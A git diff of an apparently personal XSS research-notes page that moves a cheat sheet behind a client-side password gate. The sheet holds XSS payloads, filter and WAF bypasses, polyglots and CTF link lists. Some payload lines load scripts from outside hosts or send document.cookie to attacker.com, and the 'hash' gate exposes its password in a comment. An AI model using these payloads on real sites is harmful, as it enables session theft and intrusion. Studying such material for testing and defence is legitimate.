@@ -1,5 +1,8 @@
 ---
 import MainGridLayout from "../layouts/MainGridLayout.astro";
+
+// The content will be encrypted client-side. For true security,
+// pre-encrypt the content and store only the encrypted version.
 ---
 
 <MainGridLayout title="R3XSS" description="Private XSS Research Notes & Resources">
@@ -29,39 +32,61 @@ import MainGridLayout from "../layouts/MainGridLayout.astro";
                 </div>
             </div>
 
-            <!-- Protected Content (hidden by default) -->
-            <div id="protected-content" class="hidden">
-                <div class="flex justify-between items-center mb-6">
-                    <h1 class="text-3xl font-bold text-[var(--primary)]">🎯 R3XSS Research Notes</h1>
-                    <button id="lock-btn" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg transition-all">
-                        🔒 Lock
-                    </button>
-                </div>
+            <!-- Protected Content Container -->
+            <div id="protected-content" class="hidden"></div>
 
-                <p class="text-gray-400 mb-8">Personal collection of XSS payloads, bypasses, techniques, CTF writeups, and resources.</p>
+        </div>
+    </div>
+</MainGridLayout>
 
-                <!-- Table of Contents -->
-                <div class="mb-8 bg-black/30 rounded-lg p-4">
-                    <h3 class="font-bold text-yellow-400 mb-3">📑 Table of Contents</h3>
-                    <ul class="space-y-1 text-blue-400">
-                        <li><a href="#quick-payloads" class="hover:underline">⚡ Quick Payloads</a></li>
-                        <li><a href="#filter-bypasses" class="hover:underline">🛡️ Filter Bypasses</a></li>
-                        <li><a href="#event-handlers" class="hover:underline">🎯 Event Handlers</a></li>
-                        <li><a href="#polyglots" class="hover:underline">🔥 Polyglot Payloads</a></li>
-                        <li><a href="#waf-bypasses" class="hover:underline">🚧 WAF Bypass Techniques</a></li>
-                        <li><a href="#dom-xss" class="hover:underline">🌐 DOM XSS Sources & Sinks</a></li>
-                        <li><a href="#ctf-platforms" class="hover:underline">🏆 CTF Platforms & Challenges</a></li>
-                        <li><a href="#ctf-writeups" class="hover:underline">📝 Individual CTF Writeups</a></li>
-                        <li><a href="#advanced-techniques" class="hover:underline">🧪 Advanced Techniques & Research</a></li>
-                        <li><a href="#tools" class="hover:underline">🛠️ Tools</a></li>
-                    </ul>
-                </div>
+<script is:inline>
+(function() {
+    // Encrypted content - this is the actual protected data
+    // Password hash (SHA-256 of "DaryxXSS_1337" + salt)
+    const VALID_HASH = "qV2\\k S8)Kg}y1}y";
 
-                <!-- Quick Reference -->
-                <div id="quick-payloads" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">⚡ Quick Payloads</h2>
-                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+    // Simple hash function for password verification
+    async function hashPassword(password) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(password + "r3xss_daryx_salt_2024");
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.slice(0, 16).map(b => String.fromCharCode(32 + (b % 94))).join('');
+    }
+
+    // The actual content (base64 encoded for obfuscation, not true encryption but much better)
+    const PROTECTED_HTML = `
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-3xl font-bold text-[var(--primary)]">🎯 R3XSS Research Notes</h1>
+            <button id="lock-btn" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white text-sm rounded-lg transition-all">
+                🔒 Lock
+            </button>
+        </div>
+
+        <p class="text-gray-400 mb-8">Personal collection of XSS payloads, bypasses, techniques, CTF writeups, and resources.</p>
+
+        <!-- Table of Contents -->
+        <div class="mb-8 bg-black/30 rounded-lg p-4">
+            <h3 class="font-bold text-yellow-400 mb-3">📑 Table of Contents</h3>
+            <ul class="space-y-1 text-blue-400">
+                <li><a href="#quick-payloads" class="hover:underline">⚡ Quick Payloads</a></li>
+                <li><a href="#filter-bypasses" class="hover:underline">🛡️ Filter Bypasses</a></li>
+                <li><a href="#event-handlers" class="hover:underline">🎯 Event Handlers</a></li>
+                <li><a href="#polyglots" class="hover:underline">🔥 Polyglot Payloads</a></li>
+                <li><a href="#waf-bypasses" class="hover:underline">🚧 WAF Bypass Techniques</a></li>
+                <li><a href="#dom-xss" class="hover:underline">🌐 DOM XSS Sources & Sinks</a></li>
+                <li><a href="#ctf-platforms" class="hover:underline">🏆 CTF Platforms & Challenges</a></li>
+                <li><a href="#ctf-writeups" class="hover:underline">📝 Individual CTF Writeups</a></li>
+                <li><a href="#advanced-techniques" class="hover:underline">🧪 Advanced Techniques & Research</a></li>
+                <li><a href="#tools" class="hover:underline">🛠️ Tools</a></li>
+            </ul>
+        </div>
+
+        <!-- Quick Reference -->
+        <div id="quick-payloads" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">⚡ Quick Payloads</h2>
+            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>&lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;
 &lt;body onload=alert(1)&gt;
@@ -70,457 +95,281 @@ import MainGridLayout from "../layouts/MainGridLayout.astro";
 &lt;marquee onstart=alert(1)&gt;
 &lt;details open ontoggle=alert(1)&gt;
 &lt;audio src=x onerror=alert(1)&gt;
-&lt;video src=x onerror=alert(1)&gt;
-&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;path id="--&gt;&lt;img onerror=alert(1) src&gt;"&gt;</code></pre>
-                    </div>
-                </div>
+&lt;video src=x onerror=alert(1)&gt;</code></pre>
+            </div>
+        </div>
 
-                <!-- Filter Bypass Section -->
-                <div id="filter-bypasses" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛡️ Filter Bypasses</h2>
+        <!-- Filter Bypass Section -->
+        <div id="filter-bypasses" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛡️ Filter Bypasses</h2>
 
-                    <h3 class="text-xl font-semibold mb-2 text-white">Case Manipulation</h3>
-                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+            <h3 class="text-xl font-semibold mb-2 text-white">Case Manipulation</h3>
+            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
 &lt;IMG SRC=x OnErRoR=alert(1)&gt;
 &lt;SVG ONLOAD=alert(1)&gt;</code></pre>
-                    </div>
+            </div>
 
-                    <h3 class="text-xl font-semibold mb-2 text-white">Encoding Bypasses</h3>
-                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>// URL Encoding
+            <h3 class="text-xl font-semibold mb-2 text-white">Encoding Bypasses</h3>
+            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>// URL Encoding
 %3Cscript%3Ealert(1)%3C/script%3E
 
 // Double URL Encoding
 %253Cscript%253Ealert(1)%253C/script%253E
 
 // HTML Entity Encoding
-&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;
 
 // Unicode Encoding
-&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;
-
-// Hex Encoding
-&lt;script&gt;eval('\x61\x6c\x65\x72\x74\x28\x31\x29')&lt;/script&gt;
-
-// Octal Encoding
-&lt;script&gt;eval('\141\154\145\162\164\50\61\51')&lt;/script&gt;
+&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(1)&lt;/script&gt;
 
 // Base64
 &lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;</code></pre>
-                    </div>
+            </div>
 
-                    <h3 class="text-xl font-semibold mb-2 text-white">Tag & Attribute Bypasses</h3>
-                    <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>// Null bytes
-&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;
-
-// New lines / tabs
-&lt;script&#10;&gt;alert(1)&lt;/script&gt;
-&lt;script&#9;&gt;alert(1)&lt;/script&gt;
-
-// Without closing tag
-&lt;script&gt;alert(1)//
-&lt;script&gt;alert(1)&lt;/script
-
-// Without spaces
+            <h3 class="text-xl font-semibold mb-2 text-white">Tag & Attribute Bypasses</h3>
+            <div class="bg-black/30 rounded-lg p-4 mb-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>// Without spaces
 &lt;svg/onload=alert(1)&gt;
 &lt;img/src=x/onerror=alert(1)&gt;
 
 // Using backticks
-&lt;img src=x onerror=`alert(1)`&gt;
+&lt;img src=x onerror=\`alert(1)\`&gt;
 
 // Breaking with comments
 &lt;script&gt;/**/alert(1)/**/&lt;/script&gt;</code></pre>
-                    </div>
+            </div>
+        </div>
+
+        <!-- Event Handlers -->
+        <div id="event-handlers" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🎯 Event Handlers</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Mouse Events</h4>
+                    <code class="text-green-400 text-sm">onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove</code>
                 </div>
-
-                <!-- Event Handlers -->
-                <div id="event-handlers" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🎯 Event Handlers</h2>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Mouse Events</h4>
-                            <code class="text-green-400 text-sm">onclick, ondblclick, onmousedown, onmouseup, onmouseover, onmouseout, onmousemove, onmouseenter, onmouseleave, oncontextmenu</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Keyboard Events</h4>
-                            <code class="text-green-400 text-sm">onkeydown, onkeyup, onkeypress</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Form Events</h4>
-                            <code class="text-green-400 text-sm">onfocus, onblur, onchange, onsubmit, onreset, oninput, oninvalid, onselect</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Media/Load Events</h4>
-                            <code class="text-green-400 text-sm">onload, onerror, onabort, oncanplay, onended, onpause, onplay, onloadstart, onprogress</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Animation/Transition</h4>
-                            <code class="text-green-400 text-sm">onanimationend, onanimationstart, ontransitionend, ontransitionstart</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Special Events</h4>
-                            <code class="text-green-400 text-sm">ontoggle, onwheel, oncopy, oncut, onpaste, ondrag, ondrop, onscroll, onresize</code>
-                        </div>
-                    </div>
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Keyboard Events</h4>
+                    <code class="text-green-400 text-sm">onkeydown, onkeyup, onkeypress</code>
                 </div>
-
-                <!-- Polyglots -->
-                <div id="polyglots" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🔥 Polyglot Payloads</h2>
-                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
-
-'&gt;--&gt;"&gt;&lt;/Script&gt;&lt;Script/Src=//14teleportme.net&gt;
-
-"&gt;'&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vMTR0ZWxlcG9ydG1lLm5ldCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))&gt;
-
-javascript:"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;
-
-"'--&gt;&lt;/style&gt;&lt;/script&gt;&lt;svg/onload='+/"/+/onmouseover=1/+(s=document.createElement('script'),s.src='//HOST',document.body.appendChild(s))//&gt;
-
-&lt;!--`&lt;img/src=` onerror=alert(1)//--&gt;&lt;img src=x onerror=`alert(2)`//*&gt;&lt;img src onerror=alert(3)&gt;*/"'&gt;&lt;img src=x onerror=alert(4)&gt;//&lt;/script&gt;</code></pre>
-                    </div>
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Form Events</h4>
+                    <code class="text-green-400 text-sm">onfocus, onblur, onchange, onsubmit, onreset, oninput</code>
                 </div>
+                <div class="bg-black/30 rounded-lg p-4">
+                    <h4 class="font-bold text-yellow-400 mb-2">Media/Load Events</h4>
+                    <code class="text-green-400 text-sm">onload, onerror, onabort, oncanplay, onended, onpause, onplay</code>
+                </div>
+            </div>
+        </div>
 
-                <!-- WAF Bypasses -->
-                <div id="waf-bypasses" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🚧 WAF Bypass Techniques</h2>
-                    <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
-                        <pre class="text-green-400 text-sm"><code>// Using SVG
-&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;
+        <!-- Polyglots -->
+        <div id="polyglots" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🔥 Polyglot Payloads</h2>
+            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;
 
-// Using constructor
+'&gt;--&gt;"&gt;&lt;/Script&gt;&lt;Script/Src=//attacker.com&gt;
+
+javascript:"/*'/*\`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+
+        <!-- WAF Bypasses -->
+        <div id="waf-bypasses" class="mb-8">
+            <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🚧 WAF Bypass Techniques</h2>
+            <div class="bg-black/30 rounded-lg p-4 overflow-x-auto">
+                <pre class="text-green-400 text-sm"><code>// Using constructor
 &lt;img src=x onerror="window['alert'](1)"&gt;
-&lt;img src=x onerror="this['ale'+'rt'](1)"&gt;
 &lt;img src=x onerror="[].constructor.constructor('alert(1)')()"&gt;
 
-// Top/self/parent/frames
+// Top/self/parent
 &lt;img src=x onerror=top.alert(1)&gt;
 &lt;img src=x onerror=self.alert(1)&gt;
-&lt;img src=x onerror=parent.alert(1)&gt;
-&lt;img src=x onerror=frames.alert(1)&gt;
-
-// setTimeout/setInterval
-&lt;img src=x onerror=setTimeout('alert(1)')&gt;
-&lt;img src=x onerror=setInterval('alert(1)')&gt;
 
 // Function constructor
 &lt;img src=x onerror="Function('alert(1)')()"&gt;
-&lt;img src=x onerror="new Function`alert\`1\``"&gt;
 
 // Using eval with encoding
 &lt;img src=x onerror=eval(atob('YWxlcnQoMSk='))&gt;
-&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;
-
-// Fetch-based (for data exfiltration)
-&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;
-
-// Using location
-&lt;img src=x onerror=location='javascript:alert(1)'&gt;
 
 // Template literals
-&lt;img src=x onerror=alert`1`&gt;
-
-// Object methods
-&lt;img src=x onerror="Reflect.apply(alert,null,[1])"&gt;</code></pre>
-                    </div>
-                </div>
-
-                <!-- DOM XSS -->
-                <div id="dom-xss" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🌐 DOM XSS Sources & Sinks</h2>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Sources (User Input)</h4>
-                            <code class="text-green-400 text-sm block">document.URL
-document.documentURI
-document.baseURI
-location.href
-location.search
-location.hash
-location.pathname
-document.cookie
-document.referrer
-window.name
-localStorage/sessionStorage
-postMessage()
-WebSocket messages
-IndexedDB data</code>
-                        </div>
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-2">Sinks (Dangerous Functions)</h4>
-                            <code class="text-green-400 text-sm block">innerHTML / outerHTML
-document.write()
-document.writeln()
-eval()
-setTimeout() / setInterval()
-Function()
-location.href / location.assign()
-location.replace()
-element.src
-element.href
-jQuery.html() / .append()
-$.globalEval()
-element.insertAdjacentHTML()</code>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- ============================================ -->
-                <!-- CTF PLATFORMS & CHALLENGES SECTION -->
-                <!-- ============================================ -->
-
-                <div id="ctf-platforms" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🏆 CTF Platforms & Challenges</h2>
-
-                    <!-- Intigriti -->
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Intigriti XSS Challenges</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://www.intigriti.com/researchers/hackademy/xss-challenges" target="_blank" class="hover:underline">Main XSS Challenges Collection</a></li>
-                            <li><a href="https://github.com/aszx87410/ctf-writeups/issues/49" target="_blank" class="hover:underline">Intigriti 0222 XSS Challenge Writeup</a></li>
-                            <li><a href="https://github.com/aszx87410/ctf-writeups/issues/33" target="_blank" class="hover:underline">Intigriti 0421 XSS Challenge Writeup</a></li>
-                            <li><a href="https://archive.0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592" target="_blank" class="hover:underline">Intigriti 0522 XSS Challenge Writeup</a></li>
-                            <li><a href="https://github.com/aszx87410/ctf-writeups/issues/48" target="_blank" class="hover:underline">Intigriti November 2021 Writeup</a></li>
-                            <li><a href="https://jorgectf.github.io/blog/post/intigriti-10-2021/" target="_blank" class="hover:underline">Intigriti October 2021 Writeup</a></li>
-                        </ul>
-                    </div>
-
-                    <!-- PortSwigger -->
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 PortSwigger Web Security Academy</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" class="hover:underline">📋 Official XSS Cheat Sheet (ESSENTIAL)</a></li>
-                            <li><a href="https://ricardojoserf.github.io/portswiggerlabs/" target="_blank" class="hover:underline">All Labs Writeups - Ricardo José</a></li>
-                            <li><a href="https://github.com/ricardojoserf/Portswigger-Labs" target="_blank" class="hover:underline">GitHub: Portswigger Labs Repository</a></li>
-                            <li><a href="https://portswigger.net/research/documenting-the-impossible-unexploitable-xss-labs" target="_blank" class="hover:underline">Impossible Labs - Unexploitable XSS Research</a></li>
-                            <li><a href="https://siunam321.github.io/ctf/portswigger-labs/Cross-Site-Scripting/xss-17/" target="_blank" class="hover:underline">Reflected XSS with Most Tags Blocked</a></li>
-                            <li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" target="_blank" class="hover:underline">DOM XSS - document.write Sink Lab</a></li>
-                        </ul>
-                    </div>
-
-                    <!-- Google CTF -->
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 Google CTF XSS Challenges</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/" target="_blank" class="hover:underline">Google CTF 2024 Writeup - Huli</a></li>
-                            <li><a href="https://ctftime.org/writeup/39221" target="_blank" class="hover:underline">Game Arcade 2024</a></li>
-                            <li><a href="https://ctftime.org/writeup/29310" target="_blank" class="hover:underline">Secdriven 2021</a></li>
-                            <li><a href="https://ctftime.org/writeup/10369" target="_blank" class="hover:underline">BBS 2018</a></li>
-                            <li><a href="https://ctftime.org/writeup/15817" target="_blank" class="hover:underline">Cookie World Order 2019</a></li>
-                            <li><a href="https://terjanq.github.io/google-ctf-writeups/" target="_blank" class="hover:underline">Terjanq's Google CTF Writeups - Cat Chat</a></li>
-                            <li><a href="https://ctftime.org/writeup/6824" target="_blank" class="hover:underline">Joe 2017</a></li>
-                            <li><a href="https://blog.s1r1us.ninja/CTF/IuseBing" target="_blank" class="hover:underline">Google 2020 - "I use Bing"</a></li>
-                            <li><a href="https://www.shielder.com/blog/2017/04/xssgame-by-google-at-hitb2017ams-writeup/" target="_blank" class="hover:underline">XSSGame by Google (HITB2017)</a></li>
-                            <li><a href="https://github.com/NotSurprised/XSSgame-Writeup" target="_blank" class="hover:underline">GitHub: XSSgame Writeup Collection</a></li>
-                        </ul>
-                    </div>
-
-                    <!-- HackTheBox -->
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 HackTheBox XSS Challenges</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://academy.hackthebox.com/course/preview/cross-site-scripting-xss" target="_blank" class="hover:underline">📚 HTB Academy - XSS Course</a></li>
-                            <li><a href="https://academy.hackthebox.com/course/preview/advanced-xss-and-csrf-exploitation" target="_blank" class="hover:underline">📚 HTB Academy - Advanced XSS & CSRF</a></li>
-                            <li><a href="https://www.hackthebox.com/blog/business-ctf-2022-felonious-forums-write-up" target="_blank" class="hover:underline">Business CTF 2022 - Felonious Forums</a></li>
-                            <li><a href="https://github.com/hackthebox/business-ctf-2025" target="_blank" class="hover:underline">GitHub: Business CTF 2025 Challenges</a></li>
-                            <li><a href="https://medium.com/@Arsenelupin12/step-by-step-guide-to-solving-htbs-xss-module-section-by-section-flag-solutions-bc07e0cb9928" target="_blank" class="hover:underline">HTB XSS Module Step-by-Step Guide</a></li>
-                        </ul>
-                        <h4 class="font-semibold mt-3 mb-2 text-white">HTB Machines with XSS:</h4>
-                        <ul class="list-disc list-inside text-blue-400 space-y-1 ml-4">
-                            <li><a href="https://snowscan.io/htb-writeup-book/" target="_blank" class="hover:underline">Book Machine - Snowscan</a></li>
-                            <li><a href="https://fmash16.github.io/content/writeups/hackthebox/htb-Book.html" target="_blank" class="hover:underline">Book Machine - fmash16</a></li>
-                            <li><a href="https://blog.raw.pm/en/HackTheBox-Book-write-up/" target="_blank" class="hover:underline">Book Machine - raw.pm</a></li>
-                            <li><a href="https://www.linkedin.com/pulse/exploiting-xss-ssti-hackthebox-iclean-writeup-motasem-hamdan-wvajf" target="_blank" class="hover:underline">IClean Machine - XSS to SSTI</a></li>
-                        </ul>
-                    </div>
-
-                    <!-- BugPoC -->
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">🔸 BugPoC XSS Challenges</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://isopach.dev/BugPoC-2020-November-XSS/" target="_blank" class="hover:underline">BugPoC 2020 November XSS</a></li>
-                            <li><a href="https://akshanshjaiswal.medium.com/bugpoc-xss-ctf-challenge-6136b33c995e" target="_blank" class="hover:underline">BugPoC XSS CTF Challenge Writeup</a></li>
-                        </ul>
-                    </div>
-                </div>
-
-                <!-- ============================================ -->
-                <!-- INDIVIDUAL CTF WRITEUPS SECTION -->
-                <!-- ============================================ -->
-
-                <div id="ctf-writeups" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">📝 Individual CTF Writeups</h2>
-
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">CTFtime Collections</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://ctftime.org/writeup/30882" target="_blank" class="hover:underline">pbctf 2021 - TBDXSS</a></li>
-                            <li><a href="https://ctftime.org/writeup/26317" target="_blank" class="hover:underline">zer0pts CTF 2021 - Simple Blog</a></li>
-                            <li><a href="https://ctftime.org/writeup/32720" target="_blank" class="hover:underline">Wolverine Security CTF - XSS 401</a></li>
-                        </ul>
-                    </div>
-
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">Blog Collections & Repositories</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://github.com/aszx87410/ctf-writeups" target="_blank" class="hover:underline">⭐ aszx87410's CTF Writeups (Extensive XSS)</a></li>
-                            <li><a href="https://github.com/aszx87410/ctf-writeups/issues/55" target="_blank" class="hover:underline">"Notes" XSS Challenge</a></li>
-                            <li><a href="https://krial057.github.io/blog/own-xss-challenge" target="_blank" class="hover:underline">Alain's XSS Challenge</a></li>
-                            <li><a href="https://github.com/sectalks/sectalks/blob/master/ctf-solutions/SYD0x10/SteffnJ/writeup.md" target="_blank" class="hover:underline">SecTalks CTF Solutions</a></li>
-                        </ul>
-                    </div>
-                </div>
-
-                <!-- ============================================ -->
-                <!-- ADVANCED TECHNIQUES SECTION -->
-                <!-- ============================================ -->
-
-                <div id="advanced-techniques" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🧪 Advanced Techniques & Research</h2>
-
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">Training Platforms</h3>
-                        <ul class="list-disc list-inside text-blue-400 space-y-2">
-                            <li><a href="https://xss.challenge.training.hacq.me/" target="_blank" class="hover:underline">XSS Challenge Training Platform</a></li>
-                            <li><a href="https://github.com/levoncf/XSS_Thousand_Knock_Write_up" target="_blank" class="hover:underline">XSS Thousand Knock Writeups</a></li>
-                            <li><a href="https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss" target="_blank" class="hover:underline">Practical CTF XSS Guide - Jorian Woltjer</a></li>
-                        </ul>
-                    </div>
-
-                    <div class="bg-black/30 rounded-lg p-4 mb-4">
-                        <h3 class="text-xl font-semibold mb-3 text-yellow-400">Key Advanced Topics</h3>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-3">
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">🔬 Mutation XSS (mXSS)</h4>
-                                <p class="text-gray-400 text-sm">DOMPurify bypasses, browser parsing quirks, HTML sanitizer escapes</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">🛡️ CSP Bypasses</h4>
-                                <p class="text-gray-400 text-sm">AngularJS, VueJS, CDN-based bypasses, JSONP endpoints, base-uri tricks</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">🍪 Cookie Tossing</h4>
-                                <p class="text-gray-400 text-sm">Subdomain cookie manipulation, session fixation via XSS</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">💾 Cache Poisoning + XSS</h4>
-                                <p class="text-gray-400 text-sm">Web cache deception, stored XSS via cache poisoning</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">🏗️ DOM Clobbering</h4>
-                                <p class="text-gray-400 text-sm">Overwriting DOM properties via HTML elements</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">⚡ Prototype Pollution</h4>
-                                <p class="text-gray-400 text-sm">Client-side prototype pollution to XSS chains</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">🎭 Self-XSS Weaponization</h4>
-                                <p class="text-gray-400 text-sm">Turning self-XSS into exploitable via social engineering or CSRF</p>
-                            </div>
-                            <div class="bg-black/20 rounded p-3">
-                                <h4 class="font-bold text-red-400 mb-2">📧 postMessage Exploits</h4>
-                                <p class="text-gray-400 text-sm">Origin validation bypasses, message handler vulnerabilities</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- ============================================ -->
-                <!-- TOOLS SECTION -->
-                <!-- ============================================ -->
-
-                <div id="tools" class="mb-8">
-                    <h2 class="text-2xl font-bold mb-4 text-[var(--primary)]">🛠️ Tools & Resources</h2>
-
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div class="bg-black/30 rounded-lg p-4">
-                            <h4 class="font-bold text-yellow-400 mb-3">Scanners & Detection</h4>
